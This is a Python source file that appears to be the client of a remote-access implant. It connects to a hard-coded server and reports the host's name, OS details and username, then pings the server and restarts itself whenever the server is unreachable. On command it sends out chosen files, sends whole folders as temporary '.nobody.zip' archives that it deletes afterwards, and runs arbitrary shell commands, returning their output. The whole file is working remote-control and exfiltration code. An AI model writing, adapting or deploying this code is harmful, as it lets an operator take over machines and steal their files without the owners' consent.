#!/usr/bin/env python3

import socket
import threading
import random
import time
import json
import os
import platform
import sys
import shutil
import subprocess

# data structure for communication with the server
# {
#     'client_id': client_id,
#     'hostname': hostname,
#     'socket': new_client_socket,
#     'address': new_client_address,
#     'last_ping': time.time(),
#     'main': False
# }
SERVER_ADDRESS = '192.168.1.10'
SERVER_PORT = 12345
BUFFER_SIZE = 1024
PING_PORT = 12344

def connect_to_server():
    # Create the client socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    client_socket.connect((SERVER_ADDRESS, SERVER_PORT))
    print(f'Connected to server {SERVER_ADDRESS}:{SERVER_PORT}')

    # Receive the new port number from the server
    new_port = client_socket.recv(BUFFER_SIZE)
    new_port = int(new_port.decode())
    print(f'New port: {new_port}')

    # close the client socket
    client_socket.close()

    # Connect to the new port
    data_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    data_socket.connect((SERVER_ADDRESS, new_port))
    print(f'Connected to server {SERVER_ADDRESS}:{new_port}')

    # Send the hostname to the server
    os_hostname = socket.gethostname()
    os_system = platform.system()
    os_release = platform.release()
    os_version = platform.version()
    os_username = os.getlogin()
    os_data = str({'hostname': os_hostname, 'system': os_system, 'release': os_release, 'version': os_version, 'uname': os_username})

    data_socket.sendall(os_data.encode())

    # Receive the client id from the server
    client_id = data_socket.recv(BUFFER_SIZE)
    client_id = int(client_id.decode())
    print(f'Client id: {client_id} received from server')

    # get OS description


    # send OS data to server
    data_socket.sendall(str(os_data).encode())

    # append the main client socket to the list
    a = {'hostname': os_hostname, 'socket': data_socket, 'address': (SERVER_ADDRESS, new_port), 'client_id': client_id, 'os_data': os_data, 'main': True}
    return a

    # close the data socket
    # data_socket.close()

def ping_server(a):
    while True:
        # Create the client socket
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the server
        # If server is not available, restart program
        try:
            client_socket.connect((SERVER_ADDRESS, PING_PORT))
            print(f'Connected to server {SERVER_ADDRESS}:{PING_PORT} for ping')
        
            # Send the client id to the server to ping
            # print(f'Sending client id {all_connections[0]["client_id"]} to server')
            client_socket.sendall(str(a['client_id']).encode())

            # close the client socket
            client_socket.close()

        except:
            print('Server is not available')
            # restart program
            os.execv(sys.executable, ['python'] + sys.argv)

        time.sleep(5)

def handle_client(client_socket):
    # wait for server to send the new instructions
    while True:
        data = client_socket.recv(BUFFER_SIZE)
        if not data:
            break
# Get the data from the server
# {instruction: 'download_file', filepath: 'C:\\Users\\user\\Desktop\\test.txt'}
# Send the data to the server
# {instruction: 'ok', file_size: 1234}`
        data = data.decode()
        # replace ' with " for json.loads
        data = data.replace("'", '"')
        print(f'Received data: {data}')
        data = json.loads(data)
        if data['instruction'] == 'download_file':
            # check if file exists
            if os.path.isfile(data['filepath']):
                # find file size
                file_size = os.path.getsize(data['filepath'])
                # send file size & ok to server
                instruction = "{'instruction': 'ok', 'file_size': " + str(file_size) + "}"
                client_socket.sendall(instruction.encode())
                # wait for server to send ok
                response = client_socket.recv(BUFFER_SIZE)
                print(f'Received response: {response.decode()}')
                response = response.decode()
                # replace ' with " for json.loads
                response = response.replace("'", '"')
                response = json.loads(response)
                if response['instruction'] == 'ok':
                    # send file to server
                    print(f'Sending file {data["filepath"]} to server ...')
                    with open(data['filepath'], 'rb') as f:
                        client_socket.sendfile(f,0)
                elif response['instruction'] == 'cancel':
                    print('Server cancelled download')
            else:
                # send error to server
                client_socket.sendall("{'instruction': 'error', 'message': 'file not found'}".encode())
        elif data['instruction'] == 'download_folder':
            # check if folder exists
            if os.path.isdir(data['folderpath']):
                # find folder size
                folder_size = 0
                for path, dirs, files in os.walk(data['folderpath']):
                    for f in files:
                        fp = os.path.join(path, f)
                        folder_size += os.path.getsize(fp)
                # send folder size & ok to server
                instruction = "{'instruction': 'ok', 'folder_size': " + str(folder_size) + "}"
                client_socket.sendall(instruction.encode())
                # wait for server to send ok
                response = client_socket.recv(BUFFER_SIZE)
                print(f'Received response: {response.decode()}')
                response = response.decode()
                # replace ' with " for json.loads
                response = response.replace("'", '"')
                response = json.loads(response)
                if response['instruction'] == 'ok':
                    # zip folder to .nobody.zip
                    print(f'Zipping folder {data["folderpath"]} ...')
                    shutil.make_archive(data['folderpath'] + '.nobody', 'zip', data['folderpath'])
                    # send folder to server
                    print(f'Sending folder {data["folderpath"]}.zip to server ...')
                    with open(data['folderpath'] + '.nobody.zip', 'rb') as f:
                        client_socket.sendfile(f,0)
                    # delete zip file
                    os.remove(data['folderpath'] + '.nobody.zip')
                elif response['instruction'] == 'cancel':
                    print('Server cancelled download')
        elif data['instruction'] == 'command':
            # run command
            print(f'Running command {data["command"]} ...')
            result = subprocess.run(data['command'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # send result to server
            print(f'Sending result of command {data["command"]} to server ...')
            client_socket.sendall(result.stdout)
        else:
            # send error to server
            client_socket.sendall("{'instruction': 'error', 'message': 'unknown instruction'}".encode())

def main():
    # retry connection to server if it fails
    while True:
        try:
            data = connect_to_server()
            break
        except:
            print('Failed to connect to server. Retrying in 5 seconds ...')
            time.sleep(5)

    # create thread for pinging the server
    ping_thread = threading.Thread(target=ping_server, args=(data,))
    ping_thread.start()

    handle_client(data['socket'])


if __name__ == '__main__':
    main()

